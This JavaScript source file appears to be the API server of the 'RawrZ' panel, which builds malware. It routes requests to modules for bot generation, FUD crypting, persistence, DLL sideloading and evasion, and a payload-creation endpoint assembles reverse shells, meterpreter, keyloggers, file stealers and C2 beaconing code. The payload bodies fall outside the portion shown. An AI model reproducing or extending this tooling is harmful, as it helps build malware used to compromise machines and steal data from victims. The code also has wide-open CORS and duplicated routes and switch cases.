// API Server for RawrZ Security Platform Panel
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs').promises;
const multer = require('multer');
const RawrZEngine = require('./src/engines/rawrz-engine');
const RealEncryptionEngine = require('./src/engines/real-encryption-engine');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
    origin: true, // Allow all origins - WIDE OPEN
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH', 'HEAD'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'User-Agent', 'DNT', 'Cache-Control', 'X-Mx-ReqToken', 'Keep-Alive', 'X-Requested-With', 'If-Modified-Since']
}));

// Request logging middleware (before JSON parsing)
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
    next();
});

// Custom JSON parser with error handling
app.use((req, res, next) => {
    if (req.method === 'POST' && req.headers['content-type'] && req.headers['content-type'].includes('application/json')) {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                req.body = JSON.parse(body);
                next();
            } catch (error) {
                console.error('JSON parsing error:', error);
                console.error('Raw body:', body);
                res.status(400).json({
                    success: false,
                    error: 'Invalid JSON',
                    message: error.message,
                    rawBody: body
                });
            }
        });
    } else {
        next();
    }
});

app.use(express.urlencoded({ limit: '1gb', extended: true }));
app.use(express.static('.'));

// Root route - serve main panel
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Stub generation endpoint
app.post('/generate-stub', async (req, res) => {
    try {
        const { target, stubType, encryptionMethod, stealthFeatures, antiAnalysisFeatures, evCertFeatures, hotpatchFeatures, payload, outputFormat, extension, customOptions } = req.body;
        
        // Route to stub-generator engine - use bridge approach
        let module = RawrZEngine.modules.get('stub-generator');
        if (!module) {
            module = await RawrZEngine.loadModule('stub-generator');
        }
        if (!module) {
            throw new Error('Stub Generator module not available');
        }
        const result = await module.generateStub(target, {
            stubType,
            encryptionMethod,
            stealthFeatures,
            antiAnalysisFeatures,
            evCertFeatures,
            hotpatchFeatures,
            payload,
            outputFormat,
            extension,
            customOptions
        });
        
        res.json({
            success: true,
            data: result,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Stub generation error:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        message: err.message
    });
});

// Initialize RawrZ Engine
let engineInitialized = false;

async function initializeEngine() {
    if (!engineInitialized) {
        try {
            console.log('Initializing RawrZ Engine...');
            await RawrZEngine.initializeModules();
            
            console.log('Initializing Real Encryption Engine...');
            realEncryptionEngine = new RealEncryptionEngine();
            await realEncryptionEngine.initialize();
            
            engineInitialized = true;
            console.log('All engines initialized successfully');
        } catch (error) {
            console.error('Failed to initialize engines:', error);
            console.error('Error stack:', error.stack);
            throw error;
        }
    }
}

// Routes

// Get engine status
app.get('/api/rawrz-engine/status', async (req, res) => {
    try {
        await initializeEngine();
        const status = await RawrZEngine.getStatus();
        res.json({
            success: true,
            data: status
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Execute multiple engines simultaneously
app.post('/api/rawrz-engine/execute-multiple', async (req, res) => {
    try {
        await initializeEngine();
        
        const { operations } = req.body;
        
        if (!operations || !Array.isArray(operations)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid operations array'
            });
        }
        
        console.log('Execute multiple engines request:', operations);
        
        const results = await RawrZEngine.executeMultipleEngines(operations);
        
        res.json({
            success: true,
            data: Object.fromEntries(results),
            timestamp: new Date().toISOString()
        });
        
    } catch (error) {
        console.error('Multiple engine execution error:', error);
        res.status(500).json({
            success: false,
            error: 'Multiple engine execution failed',
            message: error.message
        });
    }
});

// Get all loaded modules
app.get('/api/rawrz-engine/modules', async (req, res) => {
    try {
        await initializeEngine();
        
        const loadedModules = RawrZEngine.getAllLoadedModules();
        const moduleList = Array.from(loadedModules.keys()).map(name => ({
            name,
            status: 'loaded',
            available: true
        }));
        
        res.json({
            success: true,
            data: {
                total: loadedModules.size,
                modules: moduleList,
                timestamp: new Date().toISOString()
            }
        });
        
    } catch (error) {
        console.error('Get modules error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get modules',
            message: error.message
        });
    }
});

// Execute engine action
app.post('/api/rawrz-engine/execute', async (req, res) => {
    try {
        await initializeEngine();
        
        // Log the request body for debugging
        console.log('Execute request body:', JSON.stringify(req.body, null, 2));
        
        const { engineId, action, params } = req.body;
        
        if (!engineId || !action) {
            return res.status(400).json({
                success: false,
                error: 'Missing engineId or action'
            });
        }

        let result;
        
        // Route to appropriate engine method
        switch (engineId) {
            case 'cve-analysis-engine':
                if (action === 'analyzeCVE') {
                    result = await RawrZEngine.analyzeCVE(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('cve-analysis-engine');
                    result = await module.getStatus();
                } else if (action === 'loadDatabase') {
                    const module = await RawrZEngine.loadModule('cve-analysis-engine');
                    result = await module.loadCVEDatabase();
                }
                break;
                
            case 'http-bot-manager':
                if (action === 'manageHTTPBot') {
                    result = await RawrZEngine.manageHTTPBot(params.action, params.botData, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('http-bot-manager');
                    result = await module.getStatus();
                } else if (action === 'getStats') {
                    const module = await RawrZEngine.loadModule('http-bot-manager');
                    result = await module.getStats();
                }
                break;
                
            case 'payload-manager':
                if (action === 'managePayload') {
                    result = await RawrZEngine.managePayload(params.action, params.payloadData, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('payload-manager');
                    result = await module.getStatus();
                } else if (action === 'getStats') {
                    const module = await RawrZEngine.loadModule('payload-manager');
                    result = await module.getStats();
                }
                break;
                
            case 'plugin-architecture':
                if (action === 'managePlugin') {
                    result = await RawrZEngine.managePlugin(params.action, params.pluginData, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('plugin-architecture');
                    result = await module.getStatus();
                } else if (action === 'getPluginStats') {
                    const module = await RawrZEngine.loadModule('plugin-architecture');
                    result = await module.getPluginStats();
                }
                break;
                
            case 'startup-persistence':
                if (action === 'managePersistence') {
                    result = await RawrZEngine.managePersistence(params.action, params.persistenceData, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('startup-persistence');
                    result = await module.getStatus();
                }
                break;
                
            case 'template-generator':
                if (action === 'generateTemplate') {
                    result = await RawrZEngine.generateTemplate(params.templateType, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('template-generator');
                    result = await module.getStatus();
                } else if (action === 'getAvailableTemplates') {
                    const module = await RawrZEngine.loadModule('template-generator');
                    result = await module.getAvailableTemplates();
                }
                break;
                
            case 'advanced-fud-engine':
                if (action === 'generateFUDCode') {
                    result = await RawrZEngine.generateFUDCode(params.sourceCode, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('advanced-fud-engine');
                    result = await module.getStatus();
                } else if (action === 'getStats') {
                    const module = await RawrZEngine.loadModule('advanced-fud-engine');
                    result = await module.getStats();
                } else if (action === 'getFUDTechniques') {
                    const module = await RawrZEngine.loadModule('advanced-fud-engine');
                    result = Array.from(module.fudTechniques.values());
                }
                break;
                
            case 'rawrz-engine2':
                if (action === 'executeEngine2Operation') {
                    result = await RawrZEngine.executeEngine2Operation(params.operationType, params.operationData);
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('rawrz-engine2');
                    console.log('RawrZEngine2 module:', typeof module, Object.keys(module || {}));
                    if (module && typeof module.getStatus === 'function') {
                        result = await module.getStatus();
                    } else {
                        result = {
                            name: 'RawrZ Engine 2',
                            version: '2.0.0',
                            initialized: false,
                            error: 'getStatus method not available',
                            availableMethods: Object.keys(module || {})
                        };
                    }
                } else if (action === 'getSystemStatus') {
                    const module = await RawrZEngine.loadModule('rawrz-engine2');
                    result = await module.getSystemStatus();
                } else if (action === 'getModuleList') {
                    const module = await RawrZEngine.loadModule('rawrz-engine2');
                    result = await module.getModuleList();
                }
                break;
                
            // Original engines
            case 'reverse-engineering':
                if (action === 'reverseEngineer') {
                    result = await RawrZEngine.reverseEngineer(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('reverse-engineering');
                    result = await module.getStatus();
                }
                break;
                
            case 'advanced-analytics':
                if (action === 'runAdvancedAnalytics') {
                    result = await RawrZEngine.runAdvancedAnalytics(params.dataType, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('advanced-analytics');
                    result = await module.getStatus();
                } else if (action === 'getAnalyticsDashboard') {
                    result = await RawrZEngine.getAnalyticsDashboard();
                }
                break;
                
            case 'advanced-anti-analysis':
                if (action === 'runAdvancedAntiAnalysis') {
                    result = await RawrZEngine.runAdvancedAntiAnalysis(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('advanced-anti-analysis');
                    result = await module.getStatus();
                }
                break;
                
            case 'red-shells':
                if (action === 'createRedShell') {
                    result = await RawrZEngine.createRedShell(params.shellType, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('red-shells');
                    result = await module.getStatus();
                } else if (action === 'getActiveShells') {
                    result = await RawrZEngine.getActiveShells();
                } else if (action === 'getShellStats') {
                    result = await RawrZEngine.getShellStats();
                }
                break;
                
            case 'private-virus-scanner':
                if (action === 'scanFileWithPrivateScanner') {
                    result = await RawrZEngine.scanFileWithPrivateScanner(params.filePath, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('private-virus-scanner');
                    result = await module.getStatus();
                } else if (action === 'getScannerEngineStatus') {
                    result = await RawrZEngine.getScannerEngineStatus();
                } else if (action === 'getScannerStats') {
                    result = await RawrZEngine.getScannerStats();
                }
                break;
                
            case 'ai-threat-detector':
                if (action === 'analyzeThreatWithAI') {
                    result = await RawrZEngine.analyzeThreatWithAI(params.threatData, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('ai-threat-detector');
                    result = await module.getStatus();
                } else if (action === 'trainAIModels') {
                    result = await RawrZEngine.trainAIModels(params.options || {});
                } else if (action === 'getAIThreatDetectorStatus') {
                    result = await RawrZEngine.getAIThreatDetectorStatus();
                }
                break;
                
            case 'stub-generator':
                if (action === 'generateStub') {
                    result = await RawrZEngine.generateStub(params.target, params.stubType, params.encryptionMethod, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('stub-generator');
                    result = await module.getStatus();
                } else if (action === 'getStats') {
                    const module = await RawrZEngine.loadModule('stub-generator');
                    result = await module.getStats();
                }
                break;
                
            case 'irc-bot-generator':
                if (action === 'generateIRCBot') {
                    result = await RawrZEngine.generateIRCBot(params.botConfig, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('irc-bot-generator');
                    result = await module.getStatus();
                } else if (action === 'getStats') {
                    const module = await RawrZEngine.loadModule('irc-bot-generator');
                    result = await module.getStats();
                }
                break;
                
            case 'jotti-scanner':
                if (action === 'scanFile') {
                    const module = await RawrZEngine.loadModule('jotti-scanner');
                    result = await module.scanFile(params.filePath, params.options || {});
                } else if (action === 'getScanResult') {
                    const module = await RawrZEngine.loadModule('jotti-scanner');
                    result = await module.getScanResult(params.scanId);
                } else if (action === 'getAllScanResults') {
                    const module = await RawrZEngine.loadModule('jotti-scanner');
                    result = await module.getAllScanResults();
                } else if (action === 'deleteScanResult') {
                    const module = await RawrZEngine.loadModule('jotti-scanner');
                    result = await module.deleteScanResult(params.scanId);
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('jotti-scanner');
                    result = await module.getStatus();
                }
                break;
                
            // Advanced Analytics Engine
            case 'advanced-analytics-engine':
                if (action === 'runAdvancedAnalytics') {
                    const module = await RawrZEngine.loadModule('advanced-analytics-engine');
                    result = await module.runAdvancedAnalytics(params.data, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('advanced-analytics-engine');
                    result = await module.getStatus();
                }
                break;
                
            // Advanced Anti-Analysis
            case 'advanced-anti-analysis':
                if (action === 'runAdvancedAntiAnalysis') {
                    const module = await RawrZEngine.loadModule('advanced-anti-analysis');
                    result = await module.runAdvancedAntiAnalysis(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('advanced-anti-analysis');
                    result = await module.getStatus();
                }
                break;
                
            // Advanced Crypto
            case 'advanced-crypto':
                if (action === 'encryptData') {
                    const module = await RawrZEngine.loadModule('advanced-crypto');
                    result = await module.encryptData(params.data, params.algorithm, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('advanced-crypto');
                    result = await module.getStatus();
                }
                break;
                
            // Advanced FUD Engine
            case 'advanced-fud-engine':
                if (action === 'generateFUDCode') {
                    const module = await RawrZEngine.loadModule('advanced-fud-engine');
                    result = await module.generateFUDCode(params.language, params.platform, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('advanced-fud-engine');
                    result = await module.getStatus();
                }
                break;
                
            // Advanced Stub Generator
            case 'advanced-stub-generator':
                if (action === 'generateAdvancedStub') {
                    const module = await RawrZEngine.loadModule('advanced-stub-generator');
                    result = await module.generateAdvancedStub(params.language, params.platform, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('advanced-stub-generator');
                    result = await module.getStatus();
                }
                break;
                
            // Anti-Analysis
            case 'anti-analysis':
                if (action === 'runAntiAnalysis') {
                    const module = await RawrZEngine.loadModule('anti-analysis');
                    result = await module.runAntiAnalysis(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('anti-analysis');
                    result = await module.getStatus();
                }
                break;
                
            // API Status
            case 'api-status':
                if (action === 'getAPIStatus') {
                    const module = await RawrZEngine.loadModule('api-status');
                    result = await module.getAPIStatus();
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('api-status');
                    result = await module.getStatus();
                }
                break;
                
            // Backup System
            case 'backup-system':
                if (action === 'createBackup') {
                    const module = await RawrZEngine.loadModule('backup-system');
                    result = await module.createBackup(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('backup-system');
                    result = await module.getStatus();
                }
                break;
                
            // Beaconism DLL Sideloading
            case 'beaconism-dll-sideloading':
                if (action === 'sideloadDLL') {
                    const module = await RawrZEngine.loadModule('beaconism-dll-sideloading');
                    result = await module.sideloadDLL(params.dllPath, params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('beaconism-dll-sideloading');
                    result = await module.getStatus();
                }
                break;
                
            // Burner Encryption Engine
            case 'burner-encryption-engine':
                if (action === 'burnerEncrypt') {
                    const module = await RawrZEngine.loadModule('burner-encryption-engine');
                    result = await module.burnerEncrypt(params.data, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('burner-encryption-engine');
                    result = await module.getStatus();
                }
                break;
                
            // Camellia Assembly
            case 'camellia-assembly':
                // Bridge approach: try new method first, fallback to old method
                let camelliaModule = RawrZEngine.modules.get('camellia-assembly');
                if (!camelliaModule) {
                    camelliaModule = await RawrZEngine.loadModule('camellia-assembly');
                }
                if (!camelliaModule) {
                    throw new Error('Camellia Assembly module not available');
                }
                if (action === 'compileAssembly') {
                    result = await camelliaModule.compileAssembly(params.code, params.platform, params.options || {});
                } else if (action === 'getStatus') {
                    result = camelliaModule.getStatus();
                } else {
                    throw new Error(`Action ${action} not supported for engine camellia-assembly`);
                }
                break;
                
            // Compression Engine
            case 'compression':
                if (action === 'compressData') {
                    const module = await RawrZEngine.loadModule('compression-engine');
                    result = await module.compressData(params.data, params.algorithm, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('compression-engine');
                    result = await module.getStatus();
                }
                break;
                
            // Digital Forensics
            case 'digital-forensics':
                if (action === 'analyzeForensics') {
                    const module = await RawrZEngine.loadModule('digital-forensics');
                    result = await module.analyzeForensics(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('digital-forensics');
                    result = await module.getStatus();
                }
                break;
                
            // DotNet Workaround
            case 'dotnet-workaround':
                if (action === 'executeDotNetWorkaround') {
                    const module = await RawrZEngine.loadModule('dotnet-workaround');
                    result = await module.executeDotNetWorkaround(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('dotnet-workaround');
                    result = await module.getStatus();
                }
                break;
                
            // Dual Crypto Engine
            case 'dual-crypto-engine':
                // Bridge approach: try new method first, fallback to old method
                let dualModule = RawrZEngine.modules.get('dual-crypto-engine');
                if (!dualModule) {
                    dualModule = await RawrZEngine.loadModule('dual-crypto-engine');
                }
                if (!dualModule) {
                    throw new Error('Dual Crypto Engine module not available');
                }
                if (action === 'dualEncrypt') {
                    result = await dualModule.dualEncrypt(params.data, params.algorithms, params.options || {});
                } else if (action === 'getStatus') {
                    result = dualModule.getStatus();
                } else {
                    throw new Error(`Action ${action} not supported for engine dual-crypto-engine`);
                }
                break;
                
            // Dual Generators
            case 'dual-generators':
                if (action === 'generateDual') {
                    const module = await RawrZEngine.loadModule('dual-generators');
                    result = await module.generateDual(params.type, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('dual-generators');
                    result = await module.getStatus();
                }
                break;
                
            // EV Cert Encryptor
            case 'ev-cert-encryptor':
                // Bridge approach: try new method first, fallback to old method
                let evModule = RawrZEngine.modules.get('ev-cert-encryptor');
                if (!evModule) {
                    evModule = await RawrZEngine.loadModule('ev-cert-encryptor');
                }
                if (!evModule) {
                    throw new Error('EV Cert Encryptor module not available');
                }
                if (action === 'evEncrypt') {
                    result = await evModule.evEncrypt(params.data, params.certificate, params.options || {});
                } else if (action === 'getStatus') {
                    result = evModule.getStatus();
                } else {
                    throw new Error(`Action ${action} not supported for engine ev-cert-encryptor`);
                }
                break;
                
            // File Operations
            case 'file-operations':
                if (action === 'performFileOperation') {
                    const module = await RawrZEngine.loadModule('file-operations');
                    result = await module.performFileOperation(params.operation, params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('file-operations');
                    result = await module.getStatus();
                }
                break;
                
            // Full Assembly
            case 'full-assembly':
                if (action === 'compileFullAssembly') {
                    const module = await RawrZEngine.loadModule('full-assembly');
                    result = await module.compileFullAssembly(params.code, params.platform, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('full-assembly');
                    result = await module.getStatus();
                }
                break;
                
            // Health Monitor
            case 'health-monitor':
                if (action === 'monitorHealth') {
                    const module = await RawrZEngine.loadModule('health-monitor');
                    result = await module.monitorHealth(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('health-monitor');
                    result = await module.getStatus();
                }
                break;
                
            // Hot Patchers
            case 'hot-patchers':
                if (action === 'hotPatch') {
                    const module = await RawrZEngine.loadModule('hot-patchers');
                    result = await module.hotPatch(params.target, params.patch, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('hot-patchers');
                    result = await module.getStatus();
                }
                break;
                
            // HTTP Bot Generator
            case 'http-bot-generator':
                if (action === 'generateHTTPBot') {
                    const module = await RawrZEngine.loadModule('http-bot-generator');
                    result = await module.generateHTTPBot(params.config, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('http-bot-generator');
                    result = await module.getStatus();
                }
                break;
                
            // Implementation Checker
            case 'implementation-checker':
                if (action === 'checkImplementation') {
                    const module = await RawrZEngine.loadModule('implementation-checker');
                    result = await module.checkImplementation(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('implementation-checker');
                    result = await module.getStatus();
                }
                break;
                
            // Malware Analysis
            case 'malware-analysis':
                if (action === 'analyzeMalware') {
                    const module = await RawrZEngine.loadModule('malware-analysis');
                    result = await module.analyzeMalware(params.sample, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('malware-analysis');
                    result = await module.getStatus();
                }
                break;
                
            // Memory Manager
            case 'memory-manager':
                if (action === 'manageMemory') {
                    const module = await RawrZEngine.loadModule('memory-manager');
                    result = await module.manageMemory(params.operation, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('memory-manager');
                    result = await module.getStatus();
                }
                break;
                
            // Mobile Tools
            case 'mobile-tools':
                if (action === 'useMobileTools') {
                    const module = await RawrZEngine.loadModule('mobile-tools');
                    result = await module.useMobileTools(params.tool, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('mobile-tools');
                    result = await module.getStatus();
                }
                break;
                
            // Multi-Platform Bot Generator
            case 'multi-platform-bot-generator':
                if (action === 'generateMultiPlatformBot') {
                    const module = await RawrZEngine.loadModule('multi-platform-bot-generator');
                    result = await module.generateMultiPlatformBot(params.platforms, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('multi-platform-bot-generator');
                    result = await module.getStatus();
                }
                break;
                
            // Mutex Engine
            case 'mutex-engine':
                if (action === 'createMutex') {
                    const module = await RawrZEngine.loadModule('mutex-engine');
                    result = await module.createMutex(params.name, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('mutex-engine');
                    result = await module.getStatus();
                }
                break;
                
            // Native Compiler
            case 'native-compiler':
                if (action === 'compileNative') {
                    const module = await RawrZEngine.loadModule('native-compiler');
                    result = await module.compileNative(params.code, params.platform, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('native-compiler');
                    result = await module.getStatus();
                }
                break;
                
            // Network Tools
            case 'network-tools':
                if (action === 'useNetworkTools') {
                    const module = await RawrZEngine.loadModule('network-tools');
                    result = await module.useNetworkTools(params.tool, params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('network-tools');
                    result = await module.getStatus();
                }
                break;
                
            // OpenSSL Management
            case 'openssl-management':
                if (action === 'manageOpenSSL') {
                    const module = await RawrZEngine.loadModule('openssl-management');
                    result = await module.manageOpenSSL(params.operation, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('openssl-management');
                    result = await module.getStatus();
                }
                break;
                
            // Performance Optimizer
            case 'performance-optimizer':
                if (action === 'optimizePerformance') {
                    const module = await RawrZEngine.loadModule('performance-optimizer');
                    result = await module.optimizePerformance(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('performance-optimizer');
                    result = await module.getStatus();
                }
                break;
                
            // Performance Worker
            case 'performance-worker':
                if (action === 'workPerformance') {
                    const module = await RawrZEngine.loadModule('performance-worker');
                    result = await module.workPerformance(params.task, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('performance-worker');
                    result = await module.getStatus();
                }
                break;
                
            // Polymorphic Engine
            case 'polymorphic':
                if (action === 'polymorphCode') {
                    const module = await RawrZEngine.loadModule('polymorphic-engine');
                    result = await module.polymorphCode(params.code, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('polymorphic-engine');
                    result = await module.getStatus();
                }
                break;
                
            // RawrZ Engine (Original)
            case 'rawrz-engine':
                if (action === 'executeRawrZ') {
                    const module = await RawrZEngine.loadModule('rawrz-engine');
                    result = await module.executeRawrZ(params.operation, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('rawrz-engine');
                    result = await module.getStatus();
                }
                break;
                
            // RawrZEngine2 (Alternative)
            case 'RawrZEngine2':
                if (action === 'executeRawrZ2') {
                    const module = await RawrZEngine.loadModule('RawrZEngine2');
                    result = await module.executeRawrZ2(params.operation, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('RawrZEngine2');
                    result = await module.getStatus();
                }
                break;
                
            // Red Killer
            case 'red-killer':
                if (action === 'executeRedKiller') {
                    const module = await RawrZEngine.loadModule('red-killer');
                    result = await module.executeRedKiller(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('red-killer');
                    result = await module.getStatus();
                }
                break;
                
            // Startup Persistence
            case 'startup-persistence':
                if (action === 'managePersistence') {
                    const module = await RawrZEngine.loadModule('startup-persistence');
                    result = await module.managePersistence(params.action, params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('startup-persistence');
                    result = await module.getStatus();
                }
                break;
                
            // Stealth Engine
            case 'stealth':
                if (action === 'runStealth') {
                    const module = await RawrZEngine.loadModule('stealth-engine');
                    result = await module.runStealth(params.target, params.options || {});
                } else if (action === 'getStatus') {
                    const module = await RawrZEngine.loadModule('stealth-engine');
                    result = await module.getStatus();
                }
                break;
                
            default:
                return res.status(404).json({
                    success: false,
                    error: `Unknown engine: ${engineId}`
                });
        }
        
        res.json({
            success: true,
            data: result
        });
        
    } catch (error) {
        console.error('API Error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Get module list
app.get('/api/rawrz-engine/modules', async (req, res) => {
    try {
        await initializeEngine();
        const modules = RawrZEngine.getModuleList();
        res.json({
            success: true,
            data: modules
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Enhanced payload creation endpoint
app.post('/payload-create', async (req, res) => {
    try {
        await initializeEngine();
        
        const { type, platform, function: func, host, port, beaconUrl, payloadUrl, c2Urls, evasion, beaconism } = req.body;
        
        // Real payload generation based on type and platform
        const payload = generateRealPayload({
            type,
            platform,
            function: func,
            host,
            port,
            beaconUrl,
            payloadUrl,
            c2Urls: c2Urls || [],
            evasion,
            beaconism
        });
        
        res.json({
            success: true,
            data: payload
        });
    } catch (error) {
        console.error('Payload creation error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Real payload generation function
function generateRealPayload(config) {
    const { type, platform, function: func, host, port, beaconUrl, payloadUrl, c2Urls, evasion, beaconism } = config;
    
    let payloadCode = '';
    let payloadHeader = '';
    let payloadFooter = '';
    
    // Generate platform-specific headers
    switch (platform) {
        case 'windows-x64':
            payloadHeader = generateWindowsHeader(evasion, beaconism);
            break;
        case 'windows-x86':
            payloadHeader = generateWindowsHeader(evasion, beaconism, true);
            break;
        case 'linux-x64':
            payloadHeader = generateLinuxHeader(evasion, beaconism);
            break;
        case 'linux-arm':
            payloadHeader = generateLinuxHeader(evasion, beaconism, true);
            break;
        case 'macos-x64':
            payloadHeader = generateMacOSHeader(evasion, beaconism);
            break;
    }
    
    // Generate function-specific payload code
    switch (func) {
        case 'reverse-shell':
            payloadCode = generateReverseShellPayload(host, port, beaconism);
            break;
        case 'bind-shell':
            payloadCode = generateBindShellPayload(port, beaconism);
            break;
        case 'meterpreter':
            payloadCode = generateMeterpreterPayload(host, port, beaconism);
            break;
        case 'keylogger':
            payloadCode = generateKeyloggerPayload(beaconUrl, beaconism);
            break;
        case 'screenshot':
            payloadCode = generateScreenshotPayload(beaconUrl, beaconism);
            break;
        case 'file-stealer':
            payloadCode = generateFileStealerPayload(beaconUrl, beaconism);
            break;
        case 'persistence':
            payloadCode = generatePersistencePayload(beaconUrl, beaconism);
            break;
        case 'custom':
            payloadCode = generateCustomPayload(beaconUrl, payloadUrl, beaconism);
            break;
    }
    
    // Generate beaconism-specific code
    if (beaconism && Object.values(beaconism).some(v => v)) {
        payloadCode += generateBeaconismCode(beaconism, beaconUrl, c2Urls);
    }
    
    // Generate evasion code
    if (evasion && Object.values(evasion).some(v => v)) {
        payloadCode += generateEvasionCode(evasion);
    }
    
    // Generate footer
    payloadFooter = generatePayloadFooter(type, platform);
    
    const fullPayload = payloadHeader + payloadCode + payloadFooter;
    
    return {
        type: type,
        platform: platform,
        function: func,
        target: `${host}:${port}`,
        beaconUrl: beaconUrl,
        payloadUrl: payloadUrl,
        c2Urls: c2Urls,
        evasion: evasion,
        beaconism: beaconism,
        generatedAt: new Date().toISOString(),
        payload: fullPayload,
        size: fullPayload.length,
        checksum: require('crypto').createHash('sha256').update(fullPayload).digest('hex')
    };
}

// Platform-specific header generation
function generateWindowsHeader(evasion, beaconism, isX86 = false) {
    let header = '#include <windows.h>\n';
    header += '#include <wininet.h>\n';
    header += '#include <winreg.h>\n';
    header += '#include <tlhelp32.h>\n';
    header += '#include <psapi.h>\n';
    header += '#pragma comment(lib, "wininet.lib")\n';
    header += '#pragma comment(lib, "advapi32.lib")\n';
    header += '#pragma comment(lib, "psapi.lib")\n\n';
    
    if (beaconism && beaconism.sslTls) {
        header += '#include <wincrypt.h>\n';
        header += '#pragma comment(lib, "crypt32.lib")\n\n';
    }
    
    if (evasion && evasion.antiVM) {
        header += '// Anti-VM detection\n';
        header += 'BOOL IsVirtualMachine() {\n';
        header += '    // Check for VM artifacts\n';
        header += '    return FALSE;\n';
        header += '}\n\n';
    }
    
    return header;
}

function generateLinuxHeader(evasion, beaconism, isARM = false) {
    let header = '#include <stdio.h>\n';
    header += '#include <stdlib.h>\n';
    header += '#include <string.h>\n';
    header += '#include <unistd.h>\n';
    header += '#include <sys/socket.h>\n';
    header += '#include <netinet/in.h>\n';
    header += '#include <arpa/inet.h>\n';
    header += '#include <netdb.h>\n';
    header += '#include <fcntl.h>\n';
    header += '#include <signal.h>\n';
    header += '#include <sys/types.h>\n';
